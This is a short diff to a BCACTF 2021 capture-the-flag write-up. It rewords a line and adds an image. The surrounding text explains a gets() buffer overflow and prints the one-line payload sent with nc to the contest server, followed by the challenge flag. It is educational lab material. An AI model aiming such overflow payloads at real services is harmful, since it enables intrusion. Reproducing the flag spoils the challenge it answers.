@@ -552,6 +552,8 @@ int main() {
 
 I have to overflow the buffer to make the score equal 0x73434241 and if that happens, I get the flag. Once again, `gets()` allows me to overflow the buffer and after playing around with the `print_hex_memory()` function from the Angstrom 2021 CTF, I desgined my payload : `python2 -c 'print("\x00"*76+"\x41\x42\x43\x73")' | nc bin.bcactf.com 49154`.
 
-Injecting this into the server, we get the flag :
+After injecting this into the server, we get the flag :
+
+![BCACTF 2021 Writeup](/assets/img/ctfImages/bcactf2021/img24.png)
 
 **Flag :** bcactf{bca_is_taking_APs_in_june_aaaaaaaa_wish_past_me_luck}
